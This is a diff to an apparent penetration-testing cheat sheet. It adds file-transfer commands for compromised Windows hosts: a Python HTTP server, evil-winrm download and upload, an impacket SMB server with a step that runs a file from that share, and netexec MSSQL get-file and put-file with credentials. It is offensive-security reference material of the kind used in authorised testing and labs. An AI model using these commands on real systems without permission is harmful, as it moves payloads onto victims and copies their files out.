@@ -376,6 +376,10 @@ droopescan scan drupal --url http://<target>
 
 <details> <summary><strong>HTTP</strong></summary>
 
+```shell
+python3 -m http.server 80
+```
+
 </details>
 
 <details> <summary><strong>FTP</strong></summary>
@@ -407,13 +411,41 @@ netexec nfs <ip> --share --put-file <file> /share_path/
 
 <details> <summary><strong>evil-winrm</strong></summary>
 
+### Download file
+
+```bash
+download C:\\<share_path>\\<file>/<share_path>/<file>
+```
+
+### Upload file
+```bash
+upload /<share_path/file.exe C:\\<share_path>\\<file>
+```
+
 </details>
 
 <details> <summary><strong>SMB</strong></summary>
 
+### SMB server
+```bash
+impacket-smbserver.py <shareName> <sharePath>
+```
+
+### Run file from SMB server
+```bash
+\\<target_IP>\<shareName>\<file> 
+```
+
 </details>
 
 <details> <summary><strong>MSSQL</strong></summary>
+
+### Download file
+
+netexec mssql <target_IP> -u <user> -p <password> --get-file <share_path>/<file> <share_path>/<file>
+
+### Upload file
+netexec mssql <target_IP> -u <user> -p <password> --put-file <share_path>/<file> <share_path>/<file>
 
 </details>
 
